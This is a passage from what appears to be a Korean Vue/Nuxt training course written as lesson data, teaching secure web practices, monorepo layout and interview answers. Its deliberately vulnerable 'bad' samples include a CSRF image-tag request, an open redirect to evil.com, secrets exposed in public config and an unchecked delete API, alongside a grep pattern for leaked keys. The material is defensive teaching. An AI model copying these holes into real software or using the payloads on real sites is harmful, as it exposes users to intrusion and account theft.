// 로그아웃: 서버가 refresh 토큰을 폐기(DB) + 쿠키 삭제. 클라이언트 메모리 비움. "클라이언트만 지우기" 는 로그아웃이 아니다
`,
        },
        {
          id: 'l4', short: `CSRF`,
          title: `쿠키 인증이면 CSRF 를 막는다: SameSite + Origin 검사 (+ 토큰)`,
          why: `쿠키는 다른 사이트의 폼이 우리 API 로 요청해도 자동으로 붙습니다. SameSite=Lax 가 대부분을 막지만 서브도메인·구형 브라우저·GET 으로 상태를 바꾸는 API 는 구멍입니다. 상태를 바꾸는 요청은 Origin 헤더를 확인하고, 필요하면 CSRF 토큰(double submit) 을 씁니다.`,
          bad: String.raw`
// GET /api/orders/123/cancel 로 취소. <img src="https://example.com/api/orders/123/cancel"> 한 줄에 당한다
// 쿠키에 SameSite 없음, Origin 검사 없음
`,
          good: String.raw`
// 1) 상태 변경은 POST/PUT/DELETE 만. GET 은 읽기만
// 2) 쿠키 SameSite=Lax (03번). 외부에서 우리 사이트로 들어오는 톱레벨 GET 에만 쿠키가 간다
// 3) 서버 미들웨어: 변경 요청의 Origin 검사
export default defineEventHandler((event) => {
  if (['GET', 'HEAD', 'OPTIONS'].includes(event.method)) return
  const origin = getHeader(event, 'origin') ?? new URL(getHeader(event, 'referer') ?? '', 'http://x').origin
  const allowed = [useRuntimeConfig().public.siteUrl, 'https://admin.example.com']
  if (!allowed.includes(origin)) throw createError({ statusCode: 403, statusMessage: 'bad origin' })
})
// 4) 더 엄격히: nuxt-csurf 모듈 (double-submit 토큰). Bearer 토큰 헤더 인증이면 CSRF 가 성립하지 않으므로 생략 가능
// CORS: Access-Control-Allow-Origin: * 와 credentials 를 함께 두지 않는다. 허용 출처를 명시
`,
        },
        {
          id: 'l5', short: `서버 검증`,
          title: `프론트 검증은 UX 이고, 서버 검증이 보안이다. 둘 다 같은 스키마로`,
          why: `폼의 required, 버튼 disabled, 금액 계산은 전부 브라우저에서 바뀔 수 있습니다. 서버가 모든 입력을 다시 검증하고 금액·권한·소유를 다시 계산해야 합니다. 스키마(zod) 를 공유하면 두 벌 유지가 아니라 한 벌입니다.`,
          bad: String.raw`
// 프론트: <input required min="1"> + "총액 15,000원" 계산 → POST { items, total: 15000 }
// 서버: await db.order.create({ data: body })        // 받은 total 을 그대로, 다른 사람 addressId 도 그대로
`,
          good: String.raw`
// shared/schemas/order.ts — 양쪽에서 import
export const CreateOrder = z.object({ items: z.array(z.object({ productId: z.string().uuid(), qty: z.number().int().min(1).max(99) })).min(1).max(50), addressId: z.string().uuid(), couponCode: z.string().max(30).optional() }).strict()

// 서버
const body = CreateOrder.parse(await readBody(event))              // 모르는 키(total, userId, isAdmin) 는 strict 로 거부
const address = await db.address.findFirst({ where: { id: body.addressId, userId: user.id } })   // 소유 확인
if (!address) throw createError({ statusCode: 400, statusMessage: '배송지를 확인하세요' })
const amount = await calculateAmount(body.items, body.couponCode, user)   // 금액은 서버가 (실무 코드 11회차 02번)

// 프론트: toTypedSchema(CreateOrder) 로 같은 규칙. 메시지도 같다
// Prisma: data: body 처럼 객체를 통째로 넘기지 않는다 (mass assignment). 필드를 골라 넣는다
`,
        },
        {
          id: 'l6', short: `권한은 서버`,
          title: `v-if="isAdmin" 은 UI 일 뿐이다. 모든 API 가 권한을 다시 검사한다`,
          why: `버튼을 숨겨도 API 주소는 보입니다. 삭제 버튼이 안 보이는 사용자가 DELETE 요청을 직접 보낼 수 있습니다. 라우트 미들웨어도 클라이언트 코드라 우회됩니다. 권한 판단은 서버 핸들러마다, 그리고 "이 리소스가 이 사용자 것인지" 까지.`,
          bad: String.raw`
<button v-if="auth.isAdmin" @click="remove(id)">삭제</button>
// server/api/posts/[id].delete.ts: await db.post.delete({ where: { id } })     // 누구나
// GET /api/orders/123 — 로그인만 확인, 123 이 내 주문인지는 안 봄 (IDOR)
`,
          good: String.raw`
// server/api/posts/[id].delete.ts
export default defineEventHandler(async (event) => {
  const user = await requireUser(event)
  const post = await db.post.findUnique({ where: { id: getRouterParam(event, 'id')! }, select: { authorId: true } })
  if (!post) throw createError({ statusCode: 404 })
  if (post.authorId !== user.id && !can(user, 'post:delete:any')) throw createError({ statusCode: 403 })   // 소유자 또는 권한 (실무 코드 8회차)
  await db.post.delete({ where: { id: post.id } })
})
// 목록·조회도 where 에 userId 를 넣는다: db.order.findMany({ where: { userId: user.id } }). "id 만으로 조회" 는 관리자 API 에서만
// 프론트의 v-if / 미들웨어는 "쓸데없는 403 을 안 보여 주기 위한" 편의. 보안은 여기서 끝난다
`,
        },
        {
          id: 'l7', short: `리다이렉트`,
          title: `?redirect= 는 우리 사이트 내부 경로만 허용한다`,
          why: `로그인 후 돌아갈 주소를 쿼리로 받으면 공격자가 https://example.com/login?redirect=https://evil.com 을 보내 로그인 뒤 가짜 사이트로 보낼 수 있습니다(오픈 리다이렉트). 슬래시로 시작하는 내부 경로만, 그리고 //evil.com 같은 변형도 막습니다.`,
          bad: String.raw`
await navigateTo(route.query.redirect as string)            // 아무 데나
`,
          good: String.raw`
export function safeRedirect(target: unknown, fallback = '/') {
  if (typeof target !== 'string') return fallback
  if (!target.startsWith('/') || target.startsWith('//') || target.startsWith('/\\')) return fallback   // 외부, 프로토콜 상대, 역슬래시
  try { const u = new URL(target, 'http://x'); if (u.origin !== 'http://x') return fallback; return u.pathname + u.search + u.hash } catch { return fallback }
}
await navigateTo(safeRedirect(route.query.redirect))
// 서버 sendRedirect 도 같은 함수로. 외부로 보내야 하는 공유 링크(실무 코드 18회차 07번) 는 DB 에 저장된 URL 만, 사용자 입력 URL 은 아니다
`,
        },
        {
          id: 'l8', short: `환경변수 노출`,
          title: `runtimeConfig.public 과 NUXT_PUBLIC_ 은 브라우저로 간다. 비밀은 절대 넣지 않는다`,
          why: `public 에 넣은 값은 HTML 에 그대로 박혀 누구나 봅니다. PG secret, DB URL, 서드파티 서버 키가 public 에 들어가면 그대로 유출입니다. 비밀은 runtimeConfig 최상위(서버 전용) 에, 클라이언트가 필요한 건 서버 API 를 거칩니다. 빌드 산출물을 grep 해 확인합니다.`,
          bad: String.raw`
runtimeConfig: { public: { openaiKey: process.env.OPENAI_KEY, dbUrl: process.env.DATABASE_URL } }
// 브라우저 콘솔: useRuntimeConfig().public.openaiKey → 노출
`,
          good: String.raw`
runtimeConfig: {
  openaiKey: '',                        // NUXT_OPENAI_KEY — 서버에서만 useRuntimeConfig().openaiKey
  databaseUrl: '',
  public: { siteUrl: '', kakaoJsKey: '' } // 브라우저에서도 써야 하는 것만. kakao JS 키는 도메인 제한이 있어 공개해도 되는 키
}
// 클라이언트가 AI 를 써야 하면: server/api/ai/complete.post.ts 가 키를 들고 호출 (+ 인증 + 사용량 제한)

# 배포 전 점검
grep -rl "sk_live\|AKIA\|BEGIN PRIVATE" .output/public && echo "LEAK"   # 번들에 키 패턴이 있으면 실패
# .env 는 .gitignore, .env.example 만 커밋. 실수로 올린 키는 "삭제" 가 아니라 "폐기·재발급"
`,
        },
        {
          id: 'l9', short: `의존성`,
          title: `lockfile 을 커밋하고, 취약점 점검을 CI 에 넣고, 설치 스크립트를 의심한다`,
          why: `npm 패키지 하나가 수백 개를 끌고 옵니다. lockfile 이 없으면 CI 마다 다른 버전이 설치되고, 취약 버전이 조용히 들어옵니다. audit 를 CI 에 두고, 가능하면 설치 스크립트(postinstall) 를 막고, 업데이트는 봇이 PR 로 올려 테스트가 돌게 합니다.`,
          bad: String.raw`
# package-lock.json 을 .gitignore 에
# npm install (CI 에서도)
# 2년 전 버전 그대로, npm audit 는 "나중에"
`,
          good: String.raw`
# CI
npm ci                                         # lockfile 그대로. 다르면 실패
npm audit --audit-level=high                   # high 이상이면 실패 (false positive 는 .nsprc / audit-ci 로 예외 + 사유)
npx pnpm audit / yarn npm audit 도 같다

# .npmrc
ignore-scripts=true                            # postinstall 로 돌아가는 공급망 공격 차단. 꼭 필요한 패키지(sharp 등) 만 pnpm 의 onlyBuiltDependencies 로 허용
engine-strict=true

# 업데이트: Renovate / Dependabot 이 주 1회 PR → E2E(21회차) 가 돌고 초록이면 머지. 메이저는 사람이 본다
# 새 패키지 추가 전: 주간 다운로드, 최근 커밋, 유지자 수, 의존성 개수(npx npm-why / bundlephobia). 기능 하나에 300개 끌려오면 직접 쓴다
# 설치 직후 lockfile diff 를 본다: 요청하지 않은 패키지가 추가됐는지
`,
        },
        {
          id: 'l10', short: `속도 제한과 헤더`,
          title: `로그인·발송·검색 API 는 속도 제한을 두고, 보안 헤더는 모듈로 기본값을 깐다`,
          why: `로그인 무제한이면 비밀번호 대입, SMS 발송 무제한이면 요금 폭탄, 검색 무제한이면 DB 가 죽습니다. IP·사용자 단위로 제한하고 429 를 돌려줍니다. HSTS, X-Frame-Options, Referrer-Policy 같은 헤더는 nuxt-security 기본값이 거의 맞습니다.`,
          bad: String.raw`
// 로그인 API: 제한 없음. 10만 번 시도 가능
// 헤더: 없음. 우리 페이지가 남의 iframe 에 들어가 클릭재킹
`,
          good: String.raw`
// nuxt-security: 전역 기본 + 경로별
security: {
  rateLimiter: { tokensPerInterval: 150, interval: 60_000, driver: { name: 'redis' } },   // 전역 150/분/IP (여러 인스턴스면 redis)
  headers: { strictTransportSecurity: { maxAge: 31536000, includeSubdomains: true }, xFrameOptions: 'DENY', referrerPolicy: 'strict-origin-when-cross-origin', permissionsPolicy: { camera: [], microphone: [], geolocation: ['self'] } }
},
routeRules: {
  '/api/auth/login': { security: { rateLimiter: { tokensPerInterval: 5, interval: 60_000 } } },      // 5/분
  '/api/auth/send-code': { security: { rateLimiter: { tokensPerInterval: 3, interval: 600_000 } } }, // 3/10분
  '/api/search/**': { security: { rateLimiter: { tokensPerInterval: 60, interval: 60_000 } } }
}
// 로그인은 IP 외에 계정 단위로도: 같은 이메일 10회 실패 → 15분 잠금 + 알림 메일. 응답은 "이메일 또는 비밀번호가 틀립니다" 로 통일 (계정 존재 여부 숨김)
// 클라이언트: 429 를 받으면 Retry-After 를 읽어 "N초 후 다시 시도" (실무 코드 2회차 03번은 429 를 자동 재시도하지 않는다)
`,
        },
      ],
    },
    {
      id: 'vue-29', no: 29, name: `모노레포와 패키지 구조`,
      lead: `앱이 두 개 이상이거나 공유할 코드가 생길 때의 습관입니다. 워크스페이스로 묶고, 경계를 패키지로 긋고, 버전은 한 곳에서, 빌드는 캐시하고, 바뀐 것만 검사합니다.`,
      lessons: [
        {
          id: 'l1', short: `언제`,
          title: `공유 코드를 복붙하기 시작하면 모노레포, 그 전엔 레이어나 폴더`,
          why: `앱 하나에 모노레포를 씌우면 도구만 늘어납니다. 반대로 웹·관리자·모바일웹이 같은 UI 와 API 타입을 복붙하면 세 벌이 어긋납니다. 신호는 "같은 코드를 두 저장소에 고친다" 입니다. Nuxt 앱끼리면 레이어(16회차) 로도 충분할 때가 많습니다.`,
          bad: String.raw`
# 저장소 3개: web/, admin/, mobile-web/  — 각자 components/ui/Button.vue, utils/format.ts, types/api.ts 복사본
# 한 쪽 수정 → 나머지에 "나중에 반영" → 안 한다
`,
          good: String.raw`
# 한 저장소, pnpm workspace
apps/
  web/            # Nuxt (고객)
  admin/          # Nuxt (관리자)
packages/
  ui/             # 공용 컴포넌트 (Vue 라이브러리 또는 Nuxt 레이어)
  api-types/      # 서버 응답 타입·zod 스키마 (서버·앱 공용)
  config/         # eslint, tsconfig, tailwind 프리셋
  utils/
# 판단: 앱 1개면 폴더. 앱 2개 + 공유 UI 면 모노레포. 팀이 다르고 배포 주기가 다르면 다시 분리(npm 패키지 배포) 도 답
`,
        },
        {
          id: 'l2', short: `워크스페이스`,
          title: `pnpm workspace 로 묶고, 내부 패키지는 workspace:* 로 참조한다`,
          why: `상대 경로 import(../../packages/ui) 는 빌드 도구마다 깨지고 경계가 없습니다. 워크스페이스에 등록하면 @company/ui 처럼 보통 패키지로 import 하고, 심볼릭 링크라 수정이 즉시 반영됩니다.`,
          bad: String.raw`
import Button from '../../../packages/ui/src/Button.vue'      // 경로 지옥, 경계 없음
`,
          good: String.raw`
# pnpm-workspace.yaml
packages: ['apps/*', 'packages/*']

# packages/ui/package.json
{ "name": "@company/ui", "version": "0.0.0", "type": "module", "exports": { ".": "./src/index.ts", "./nuxt": "./nuxt.config.ts" }, "peerDependencies": { "vue": "^3.5" } }

# apps/web/package.json
{ "dependencies": { "@company/ui": "workspace:*", "@company/api-types": "workspace:*" } }

// apps/web 에서
import { Button } from '@company/ui'
import type { Order } from '@company/api-types'
// Nuxt 앱이 소스(.ts/.vue) 그대로 import 하려면 nuxt.config: build.transpile: ['@company/ui'] 또는 레이어로 extends
`,
        },
        {
          id: 'l3', short: `경계`,
          title: `앱은 패키지를 import 하고, 패키지는 앱을 모른다. 앱끼리도 import 하지 않는다`,
          why: `admin 이 web 의 컴포넌트를 import 하기 시작하면 web 의 리팩터링이 admin 을 깨고, 빌드가 서로 얽힙니다. 공유할 게 생기면 패키지로 내립니다. 패키지가 앱을 알면(useAuthStore 를 import) 그 패키지는 다른 앱에서 못 씁니다.`,
          bad: String.raw`
// apps/admin/pages/orders.vue
import OrderStatusBadge from '../../web/components/OrderStatusBadge.vue'   // 앱 → 앱
// packages/ui/src/UserMenu.vue
import { useAuthStore } from '../../../apps/web/stores/auth'              // 패키지 → 앱
`,
          good: String.raw`
// 공유 컴포넌트는 packages/ui 로 내리고, 앱 의존(인증·라우터) 은 props/slots/emit 으로 받는다
// packages/ui/src/UserMenu.vue
defineProps<{ user: { name: string; avatar?: string } | null }>()
defineEmits<{ logout: [] }>()
// apps/web: <UserMenu :user="auth.user" @logout="auth.logout()" />

// 경계를 린트로 강제 (eslint-plugin-import 또는 boundaries)
'import/no-restricted-paths': ['error', { zones: [
  { target: './packages', from: './apps', message: '패키지는 앱을 import 할 수 없습니다' },
  { target: './apps/web', from: './apps/admin' }, { target: './apps/admin', from: './apps/web' }
] }]
// dependency-cruiser 로 순환 의존(A→B→A) 도 CI 에서 실패시킨다
`,
        },
        {
          id: 'l4', short: `버전 한 곳`,
          title: `vue·nuxt·typescript 버전은 catalog 로 한 곳에서 고정한다`,
          why: `패키지마다 vue 버전이 다르면 두 벌이 설치되고 "컴포넌트가 다른 Vue 인스턴스" 류의 괴상한 버그가 납니다. pnpm catalog(또는 syncpack) 로 핵심 의존성을 한 곳에 적고 모두가 참조하면 업그레이드도 한 줄입니다.`,
          bad: String.raw`
# apps/web: "vue": "^3.4.21"   packages/ui: "vue": "^3.5.0"   apps/admin: "vue": "3.3.4"
# → node_modules 에 vue 가 셋. inject/provide, Pinia 가 서로를 못 본다
`,
          good: String.raw`
# pnpm-workspace.yaml
packages: ['apps/*', 'packages/*']
catalog:
  vue: ^3.5.13
  nuxt: ^3.16.0
  typescript: ^5.7.0
  '@vueuse/core': ^12.0.0

# 각 package.json
"dependencies": { "vue": "catalog:", "@vueuse/core": "catalog:" }

# 점검: pnpm ls vue --depth 0 -r  → 모두 같은 버전인지
# 공유 패키지의 vue 는 dependencies 가 아니라 peerDependencies (02번): 앱의 vue 하나만 설치되게
`,
        },
        {
          id: 'l5', short: `설정 공유`,
          title: `tsconfig, eslint, tailwind 프리셋은 config 패키지에서 상속한다`,
          why: `앱마다 tsconfig 를 복사하면 strict 옵션이 한 곳만 꺼진 채 몇 달이 갑니다. 기본 설정을 패키지로 두고 extends 하면 규칙이 하나이고, 바꾸면 전부에 적용됩니다. Nuxt 는 .nuxt/tsconfig.json 을 생성하므로 그 위에 얹습니다.`,
          bad: String.raw`
# apps/web/tsconfig.json, apps/admin/tsconfig.json, packages/ui/tsconfig.json — 각자 복사, 각자 다르게 수정됨
`,
          good: String.raw`
# packages/config/tsconfig.base.json
{ "compilerOptions": { "strict": true, "noUncheckedIndexedAccess": true, "verbatimModuleSyntax": true, "moduleResolution": "bundler", "target": "ES2022" } }
# apps/web/tsconfig.json  (Nuxt 가 만든 것을 먼저, 공용은 그 위에)
{ "extends": ["./.nuxt/tsconfig.json", "@company/config/tsconfig.base.json"] }
# packages/ui/tsconfig.json
{ "extends": "@company/config/tsconfig.base.json", "include": ["src"] }

// packages/config/eslint.js — @nuxt/eslint-config 또는 antfu 프리셋 + 회사 규칙. 각 앱의 eslint.config.js 는 import 해서 export
// packages/config/tailwind.preset.js — 색·폰트 토큰. 각 앱 tailwind.config: presets: [preset], content 에 '../../packages/ui/src/**/*.vue' 포함 (안 하면 ui 의 클래스가 purge 된다)
`,
        },
        {
          id: 'l6', short: `UI 패키지`,
          title: `공용 UI 는 소스 그대로 쓰는 레이어이거나, 빌드된 라이브러리이거나 둘 중 하나로 정한다`,
          why: `Nuxt 앱들만 쓰면 레이어가 가장 간단합니다(빌드 없음, auto-import). Vue 단독 앱이나 외부 배포가 있으면 vite 라이브러리 모드로 빌드해 dist 를 내보냅니다. 둘을 섞으면 "어느 쪽 코드가 실행되는지" 로 헷갈립니다.`,
          bad: String.raw`
// packages/ui 가 src 도 export 하고 dist 도 export 하고, 어떤 앱은 src 를, 어떤 앱은 dist 를 import
// → HMR 이 안 되거나, 빌드된 쪽만 버그가 고쳐지지 않거나
`,
          good: String.raw`
// 선택 A: Nuxt 레이어 (Nuxt 앱만 쓴다)
// packages/ui/nuxt.config.ts
export default defineNuxtConfig({ components: [{ path: './components', prefix: 'Ui' }], css: ['./assets/tokens.css'] })
// apps/web/nuxt.config.ts: extends: ['@company/ui']   → <UiButton /> 자동 import, 빌드 없음, HMR 됨

// 선택 B: 라이브러리 (Vue 앱·외부 배포도 쓴다)
// packages/ui/vite.config.ts
export default defineConfig({ plugins: [vue()], build: { lib: { entry: 'src/index.ts', formats: ['es'] }, rollupOptions: { external: ['vue'] } } })
// package.json exports: { ".": { "types": "./dist/index.d.ts", "import": "./dist/index.js" } }, vite-plugin-dts 로 타입
// 개발 중 HMR: 앱 vite.config 의 resolve.alias 로 '@company/ui' → src (dev 에서만), 또는 turbo dev 로 watch 빌드
`,
        },
        {
          id: 'l7', short: `타입 공유`,
          title: `API 응답 타입과 검증 스키마는 서버와 앱이 같은 패키지에서 가져온다`,
          why: `서버가 필드 이름을 바꿨는데 앱의 types/api.ts 는 그대로면 런타임에만 터집니다. zod 스키마를 패키지에 두고 서버는 parse, 앱은 z.infer 로 타입을 쓰면 바꾸는 순간 양쪽 컴파일이 깨져 알게 됩니다. Nuxt 의 server/ 와 같은 앱이면 shared/ 폴더(Nuxt 4) 가 이 역할입니다.`,
          bad: String.raw`
// server: return { id, totalAmount }       // 이름을 amount → totalAmount 로 변경
// apps/web/types/api.ts: interface Order { id: string; amount: number }   // 그대로. order.amount 는 undefined
`,
          good: String.raw`
// packages/api-types/src/order.ts
export const OrderSchema = z.object({ id: z.string(), amount: z.number().int(), status: z.enum(['PENDING', 'PAID', 'SHIPPED']), createdAt: z.string().datetime() })
export type Order = z.infer<typeof OrderSchema>
export const CreateOrderInput = z.object({ ... })

// 서버 (apps/api 또는 apps/web/server): 응답을 만들 때 타입으로 강제
export default defineEventHandler(async (event): Promise<Order> => { ... })
// 앱: useFetch<Order>('/api/orders/' + id)  — 필드가 바뀌면 여기서 컴파일 오류

// 서버가 별도 언어(Java/Go)면: OpenAPI 스펙 → openapi-typescript 로 타입 생성을 패키지에 두고 CI 에서 스펙 변경 시 재생성
// Nuxt 4 단일 앱: shared/ 폴더가 서버·클라이언트 양쪽 auto-import (파인코드 20회차)
`,
        },
        {
          id: 'l8', short: `태스크와 캐시`,
          title: `빌드·린트·테스트는 turbo 가 의존 순서로 돌리고 결과를 캐시한다`,
          why: `패키지 8개를 손으로 순서 맞춰 빌드하면 틀리고 느립니다. turbo(또는 nx) 가 package.json 의 의존 관계로 순서를 정하고, 입력이 같으면 캐시된 결과를 씁니다. CI 에서 바뀌지 않은 패키지의 테스트는 0초입니다.`,
          bad: String.raw`
# package.json
"build": "pnpm -r run build"      # 순서가 알파벳. ui 보다 web 이 먼저 빌드되면 실패. 매번 전부
`,
          good: String.raw`
# turbo.json
{
  "tasks": {
    "build": { "dependsOn": ["^build"], "outputs": [".output/**", "dist/**", ".nuxt/**"] },   # ^build: 의존 패키지 먼저
    "lint": { "dependsOn": ["^build"] },
    "typecheck": { "dependsOn": ["^build"] },
    "test": { "dependsOn": ["build"], "outputs": ["coverage/**"] },
    "dev": { "cache": false, "persistent": true }
  }
}
# 루트 package.json: "build": "turbo run build", "dev": "turbo run dev --filter=web..."   (web 과 그 의존만)
# CI: turbo run build lint typecheck test --filter=...[origin/main]   # main 이후 바뀐 패키지와 그 의존자만 (10번)
# 원격 캐시(Vercel Remote Cache / 자체 S3) 를 켜면 동료가 빌드한 결과를 CI 가 재사용
`,
        },
        {
          id: 'l9', short: `개발 환경`,
          title: `루트에서 명령 하나로 전부 뜨고, 앱별 .env 는 앱 폴더에 둔다`,
          why: `"web 띄우고, admin 띄우고, ui 는 watch 빌드" 를 README 로 설명하면 아무도 안 합니다. 루트의 pnpm dev 가 필요한 것을 다 띄우고, 포트가 겹치지 않게 고정합니다. 환경변수는 앱마다 다르니 각 앱 폴더의 .env 이고, 루트 .env 는 공통만.`,
          bad: String.raw`
# README: "터미널 3개를 열어서 각각 cd 한 뒤 npm run dev 를 치세요. ui 를 고치면 admin 에서 안 보이니 재시작하세요"
`,
          good: String.raw`
# 루트 package.json
"dev": "turbo run dev --parallel", "dev:web": "turbo run dev --filter=web...", "dev:admin": "turbo run dev --filter=admin..."
# apps/web/package.json: "dev": "nuxi dev --port 3000"      apps/admin: "--port 3001"      packages/ui (라이브러리면): "dev": "vite build --watch"
# 레이어 방식(06번 A) 이면 ui 는 dev 가 필요 없다 — 앱이 소스를 직접 본다

# 환경변수
# .env              공통 (DATABASE_URL 같은 로컬 개발 DB)
# apps/web/.env     NUXT_PUBLIC_SITE_URL=http://localhost:3000, 결제 테스트 키
# apps/admin/.env   NUXT_PUBLIC_SITE_URL=http://localhost:3001
# .env.example 들만 커밋. 처음 받은 사람: pnpm install && pnpm setup:env (example 복사 스크립트) && pnpm dev

# 루트 README 에 "5분 안에 띄우기" 섹션. 안 되는 순간 README 를 고친다
`,
        },
        {
          id: 'l10', short: `변경 영향`,
          title: `CI 와 배포는 바뀐 패키지와 그 의존자만 돌린다`,
          why: `ui 의 버튼 색을 바꿨는데 모바일웹까지 전부 빌드·테스트·배포하면 PR 하나에 40분입니다. turbo --filter=...[origin/main] 으로 영향 범위를 계산하고, 배포도 영향받은 앱만. 반대로 공용 패키지가 바뀌면 그걸 쓰는 앱 전부가 돌아야 합니다.`,
          bad: String.raw`
# .github/workflows/ci.yml
- run: pnpm -r build && pnpm -r test       # 매 PR 전부. admin 한 줄 고쳐도 web E2E 20분
`,
          good: String.raw`
# ci.yml
- uses: actions/checkout@v4
  with: { fetch-depth: 0 }                                  # main 과 비교하려면 히스토리 필요
- run: pnpm install --frozen-lockfile
- run: pnpm turbo run lint typecheck test build --filter=...[origin/main]   # 바뀐 것 + 그 의존자만. ui 가 바뀌면 web·admin 도 포함
- run: pnpm turbo run e2e --filter=...[origin/main] --filter=./apps/*       # E2E 는 앱만

# 배포: 앱별 워크플로에 paths 필터 또는 turbo-ignore
#   apps/web 배포 → npx turbo-ignore web  (web 과 의존 패키지에 변경 없으면 배포 스킵. Vercel 의 "Ignored Build Step" 에 넣는다)
# 규칙: packages/config 처럼 전부에 영향 주는 패키지는 어차피 전체가 돈다 → 자주 안 바뀌게 설계
`,
        },
      ],
    },
    {
      id: 'vue-30', no: 30, name: `면접 단골 질문`,
      lead: `면접에서 자주 나오는 질문과, 흔한 얕은 답(나쁨) 과 깊은 답(좋음) 입니다. 답을 외우기보다 왜 그런지 코드로 설명할 수 있으면 됩니다. 각 항목의 번호는 이 스터디의 해당 회차입니다.`,
      lessons: [
        {
          id: 'l1', short: `ref vs reactive`,
          title: `"ref 는 원시값, reactive 는 객체" 에서 끝나면 얕은 답이다`,
          why: `차이의 핵심은 "재할당과 구조 분해" 입니다. reactive 는 통째로 바꾸거나 구조 분해하면 반응성이 끊기고, ref 는 .value 로 재할당해도 연결이 유지됩니다. 그래서 기본은 ref, 묶음 상태만 reactive 라고 답할 수 있어야 합니다.`,
          badLabel: '얕은 답', goodLabel: '깊은 답',
          bad: String.raw`
"ref 는 숫자·문자열 같은 원시값에 쓰고, reactive 는 객체에 씁니다.
 ref 는 .value 를 붙여야 해서 불편합니다."
`,
          good: String.raw`
"둘 다 Proxy 기반이고 ref 는 { value } 객체를 reactive 로 감싼 것입니다. 차이는 사용법에서 납니다.
 1) 재할당: reactive 는 state = {...} 로 바꾸면 연결이 끊기지만 ref 는 ref.value = {...} 가 됩니다.
 2) 구조 분해: const { a } = reactiveObj 는 반응성을 잃고 (toRefs 필요), ref 는 변수 자체가 반응형 컨테이너입니다.
 3) 템플릿에서는 ref 가 자동으로 언래핑되고, reactive 안의 ref 도 언래핑됩니다.
 그래서 기본은 ref 로 쓰고, 폼처럼 항상 묶어 다니는 상태만 reactive 로 씁니다. (3회차 01번)"

const count = ref(0); count.value++                       // 유지
const form = reactive({ name: '' }); form = reactive({})  // 끊김 (재할당 불가)
const { name } = form                                     // 끊김 → const { name } = toRefs(form)
`,
        },
        {
          id: 'l2', short: `computed vs watch`,
          title: `"둘 다 값 변화를 감지한다" 가 아니라 "파생값이냐 부수효과냐" 로 답한다`,
          why: `computed 는 다른 값에서 만들어지는 값이고 캐시되며 동기입니다. watch 는 값이 바뀔 때 무언가를 하는 것(요청, 저장, 로그) 입니다. watch 로 다른 ref 를 계산해 넣는 코드는 거의 항상 computed 로 바꿀 수 있습니다.`,
          badLabel: '얕은 답', goodLabel: '깊은 답',
          bad: String.raw`
"computed 는 캐시가 되고 watch 는 안 됩니다. watch 는 비동기가 되고 computed 는 안 됩니다."
`,
          good: String.raw`
"computed 는 '값' 입니다. 의존한 것이 바뀌면 다음에 읽을 때 다시 계산되고, 안 읽으면 계산도 안 합니다(lazy + 캐시). 순수해야 하고 부수효과가 없어야 합니다.
 watch 는 '반응' 입니다. 특정 소스가 바뀌면 콜백을 실행하고, 거기서 API 호출·저장·라우팅 같은 부수효과를 합니다.
 그래서 '값에서 값' 은 computed, '값이 바뀌면 무언가 한다' 는 watch 입니다.
 watchEffect 는 소스를 자동 추적하지만 무엇에 반응하는지 안 보여 디버깅이 어려우니 간단한 동기화에만 씁니다. (3회차 03·04번)"

// ✗ watch 로 파생값
watch([price, qty], () => { total.value = price.value * qty.value })
// ✓
const total = computed(() => price.value * qty.value)
// ✓ 부수효과는 watch
watch(query, (q) => fetchResults(q), { immediate: true })
`,
        },
        {
          id: 'l3', short: `v-if vs v-show`,
          title: `토글 빈도와 초기 비용, 그리고 SSR·접근성까지 말한다`,
          why: `v-if 는 DOM 과 컴포넌트를 만들고 없애고, v-show 는 display 만 바꿉니다. 자주 토글하면 v-show, 드물거나 무거우면 v-if. 여기에 v-if 는 지연 로딩이 되고, v-show 는 숨겨도 DOM 에 있어 탭 포커스와 스크린리더에 걸린다는 점까지.`,
          badLabel: '얕은 답', goodLabel: '깊은 답',
          bad: String.raw`
"v-if 는 조건이 false 면 렌더링을 안 하고 v-show 는 display: none 입니다."
`,
          good: String.raw`
"v-if 는 조건이 거짓이면 요소와 자식 컴포넌트를 아예 만들지 않고, 참이 되면 생성(마운트) 합니다. 토글마다 생성·파괴 비용이 들지만 초기에 안 보이는 건 비용이 0 이고, 자식의 setup/onMounted 가 그때 돕니다.
 v-show 는 항상 렌더링하고 CSS display 만 바꿉니다. 초기 비용은 있지만 토글은 거의 공짜입니다.
 그래서 자주 켜고 끄는 것(탭, 드롭다운) 은 v-show, 드물게 보이거나 무거운 것(모달, 큰 폼) 은 v-if 입니다.
 주의점: v-show 로 숨긴 요소는 DOM 에 있어 Tab 키로 포커스가 가고 스크린리더가 읽을 수 있으니 inert 나 aria-hidden 을 같이 써야 합니다. v-show 는 <template> 에 못 쓰고, v-else 가 없습니다. (1회차, 22회차)"
`,
        },
        {
          id: 'l4', short: `key 의 역할`,
          title: `"목록에 key 를 써야 한다" 가 아니라 패치 알고리즘과 상태 유지를 설명한다`,
          why: `key 는 가상 DOM 이 "같은 노드" 를 판단하는 기준입니다. 없거나 index 면 순서가 바뀔 때 노드를 재사용해 입력값·애니메이션·자식 상태가 엉뚱한 행에 남습니다. 반대로 key 를 바꿔 강제로 다시 만드는 용법도 있습니다.`,
          badLabel: '얕은 답', goodLabel: '깊은 답',
          bad: String.raw`
"v-for 에는 key 를 꼭 써야 합니다. 경고가 나옵니다. index 를 쓰면 됩니다."
`,
          good: String.raw`
"Vue 는 리스트를 다시 그릴 때 key 로 이전 노드와 새 노드를 짝지어 최소한의 DOM 변경을 합니다.
 key 가 index 면 맨 앞에 항목을 넣었을 때 '0번 노드' 가 그대로 재사용되고 내용만 바뀌어, 그 행의 <input> 입력값·체크 상태·transition·자식 컴포넌트 state 가 엉뚱한 항목에 남습니다.
 고유 id 를 key 로 쓰면 노드가 항목을 따라 이동합니다.
 반대로 같은 자리의 컴포넌트를 강제로 새로 만들고 싶을 때 :key='route.params.id' 처럼 key 를 바꾸는 용법도 있습니다. 라우트 파라미터만 바뀔 때 setup 을 다시 돌리는 경우입니다. (1회차 04번)"

<li v-for="item in items" :key="item.id">          // ✓
<li v-for="(item, i) in items" :key="i">           // ✗ 정렬·삽입·삭제가 있는 목록
<UserProfile :key="route.params.id" />             // 강제 재생성
`,
        },
        {
          id: 'l5', short: `nextTick`,
          title: `"DOM 업데이트 후 실행" 에 더해 "왜 비동기로 묶는지" 를 말한다`,
          why: `Vue 는 상태 변경을 모아 다음 마이크로태스크에 한 번만 렌더링합니다. 그래서 count.value++ 직후 DOM 은 아직 옛 값입니다. nextTick 은 그 렌더링 뒤를 기다리는 Promise 입니다. 쓸 일은 DOM 을 재거나 포커스할 때뿐이고, 상태만 바꾸는 코드에는 필요 없습니다.`,
